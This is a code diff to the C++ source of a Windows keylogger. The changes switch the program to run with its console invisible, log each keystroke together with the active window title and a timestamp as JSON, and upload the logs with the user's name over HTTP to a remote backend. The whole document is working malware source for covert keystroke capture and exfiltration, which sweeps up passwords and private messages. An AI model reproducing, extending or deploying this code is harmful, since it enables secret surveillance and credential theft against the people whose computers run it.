@@ -10,12 +10,18 @@
 #include <thread>
 #include <chrono>   
 #include <vector>
+#include <sstream>
+#include <fstream>
+#include "json.hpp"
 
+
+
+using json = nlohmann::json;
 using namespace std;
 
 // Configurations
 #define FORMAT 0        // 0 = labels, 10 = decimal, 16 = hex
-#define VISIBLE       // INVISIBLE or VISIBLE
+#define INVISIBLE       // INVISIBLE or VISIBLE
 #define BOOT_WAIT       // BOOT_WAIT or NOWAIT
 #define MOUSE_IGNORE    // ignore mouse clicks
 
@@ -87,61 +93,59 @@ public:
 
     void LogKeystroke(int vkCode) {
 #ifdef MOUSE_IGNORE
-        if (vkCode == 1 || vkCode == 2) return;
+    if (vkCode == 1 || vkCode == 2) return;
 #endif
 
-        HWND activeWindow = GetForegroundWindow();
-        DWORD threadId = 0;
-        HKL keyboardLayout = nullptr;
+    HWND activeWindow = GetForegroundWindow();
+    DWORD threadId = 0;
+    HKL keyboardLayout = nullptr;
 
-        if (activeWindow) {
-            threadId = GetWindowThreadProcessId(activeWindow, nullptr);
-            keyboardLayout = GetKeyboardLayout(threadId);
+    char windowTitle[256] = "Unknown";
 
-            char windowTitle[256];
-            GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
-
-            if (strcmp(windowTitle, lastWindow) != 0) {
-                strcpy(lastWindow, windowTitle);
-
-                // Timestamp
-                time_t t = time(nullptr);
-                struct tm timeInfo;
-                struct tm* timeInfoPtr = localtime(&t);
-                if (timeInfoPtr) {
-                    timeInfo = *timeInfoPtr;
-                }
-
-                char timeStr[64];
-                strftime(timeStr, sizeof(timeStr), "%FT%X%z", &timeInfo);
-
-                logFile << "\n\n[Window: " << windowTitle << " - at " << timeStr << "] ";
-            }
-        }
-
-        stringstream output;
-
-#if FORMAT == 10
-        output << '[' << vkCode << ']';
-#elif FORMAT == 16
-        output << hex << "[" << vkCode << ']';
-#else
-        if (keyLabels.count(vkCode)) {
-            output << keyLabels.at(vkCode);
-        } else {
-            char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
-            bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-
-            if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
-            if (!isLowercase) ch = tolower(ch);
-
-            output << ch;
-        }
-#endif
-
-        logFile << output.str();
-        logFile.flush();
+    if (activeWindow) {
+        threadId = GetWindowThreadProcessId(activeWindow, nullptr);
+        keyboardLayout = GetKeyboardLayout(threadId);
+        GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
     }
+
+    // Map key code to readable label or char
+    stringstream keyLabel;
+#if FORMAT == 10
+    keyLabel << vkCode;
+#elif FORMAT == 16
+    keyLabel << hex << vkCode;
+#else
+    if (keyLabels.count(vkCode)) {
+        keyLabel << keyLabels.at(vkCode);
+    } else {
+        char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
+        bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+        if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
+        if (!isLowercase) ch = tolower(ch);
+        keyLabel << ch;
+    }
+#endif
+
+    // Timestamp
+    time_t t = time(nullptr);
+    struct tm timeInfo;
+    localtime_s(&timeInfo, &t);
+
+    char timeStr[64];
+    strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S%z", &timeInfo);
+
+    // Build JSON log entry using nlohmann::json
+    json logEntry = {
+        {"timestamp", std::string(timeStr)},
+        {"key", keyLabel.str()},
+        {"window", std::string(windowTitle)}
+    };
+
+    // Write to log as a single line
+    logFile << logEntry.dump() << "\n";
+    logFile.flush();
+}
+
 
     static void SetConsoleVisibility() {
 #ifdef INVISIBLE
@@ -175,6 +179,22 @@ string getUserName(){
     return ""; 
 }
 
+string getLogsAsJsonArray(const std::string& filename) {
+    ifstream logFile(filename);
+    string line;
+    json logs = json::array();
+    while (getline(logFile, line)) {
+        if (!line.empty()) {
+            try {
+                logs.push_back(json::parse(line));
+            } catch (...) {
+                // skip invalid lines
+            }
+        }
+    }
+    return logs.dump();
+}
+
 // Function to simulate backend call (here just printing to console)
 void sendLogsToBackend() {
     ifstream logFile(log_file_name);
@@ -192,6 +212,8 @@ void sendLogsToBackend() {
         std::cout << "Log file is empty. Skipping upload.\n";
         return;
     }
+
+    string hostname = getUserName();
 
     HINTERNET hSession = InternetOpenA("LogUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) {
@@ -214,8 +236,10 @@ void sendLogsToBackend() {
         return;
     }
 
-    std::string body = "{\"logs\":\"" + logs + "\"}";
-    std::string headers = "Content-Type: application/json\r\n";
+    string logsJson = getLogsAsJsonArray(log_file_name);
+    string body = "{\"logs\":" + logsJson + ",\"hostname\":\"" + hostname + "\"}";
+    // string body = "{\"logs\":\"" + logs + "\",\"hostname\":\"" + hostname + "\"}";
+    string headers = "Content-Type: application/json\r\n";
 
     BOOL bRequestSent = HttpSendRequestA(
         hRequest,
@@ -289,5 +313,4 @@ int main() {
     Keylogger& logger = Keylogger::GetInstance();
     logger.InstallHook();
     logger.Run();
-
 }
